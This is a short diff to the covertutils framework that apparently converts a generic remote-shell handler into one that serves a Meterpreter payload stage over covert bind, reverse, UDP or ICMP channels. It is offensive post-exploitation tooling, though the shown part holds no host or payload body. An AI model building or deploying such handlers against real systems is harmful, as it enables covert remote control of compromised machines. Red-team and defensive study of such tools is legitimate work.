@@ -7,16 +7,15 @@ from abc import ABCMeta, abstractmethod
 from covertutils.helpers import defaultArgMerging
 from covertutils.handlers import FunctionDictHandler
 
+
 from covertutils.payloads import LinuxStages, GenericStages
 
+
 pls = {
-	'control' : GenericStages['control']['marshal'],
-	'os-shell' : GenericStages['shell']['marshal'],
-	'python' : GenericStages['pythonapi']['marshal'],
-	'file' : GenericStages['file']['marshal'],
+	'meterpreter' : GenericStages['meterpreter']['marshal'],
 }
 
-class StandardShellHandler ( FunctionDictHandler ) :
+class MeterpreterShellHandler ( FunctionDictHandler ) :
 	"""
 	This class provides an implementation of Simple Remote Shell.
 	It can be used on any shell type and protocol (bind, reverse, udp, icmp, etc),by adjusting `send_function()` and `receive_function()`
@@ -32,12 +31,16 @@ class StandardShellHandler ( FunctionDictHandler ) :
 :param function send_function: A function that takes raw data as argument and sends it across.
 :param `orchestration.SimpleOrchestrator` orchestrator: An Object that is used to translate raw_data to `(stream, message)` tuples.
 		"""
+
+		orchestrator.addStream('meterpreter')
+		orchestrator.streamIdent.setHardStreamName('meterpreter')
+		orchestrator.deleteStream('control')
  		kw['function_dict'] = pls
-		super( StandardShellHandler, self ).__init__( recv, send, orchestrator, **kw )
+		super( MeterpreterShellHandler, self ).__init__( recv, send, orchestrator, **kw )
 
 
 	def onMessage( self, stream, message ) :
-		resp = super( StandardShellHandler, self ).onMessage( stream, message )
+		resp = super( MeterpreterShellHandler, self ).onMessage( stream, message )
 		self.preferred_send( resp, stream )
 
 
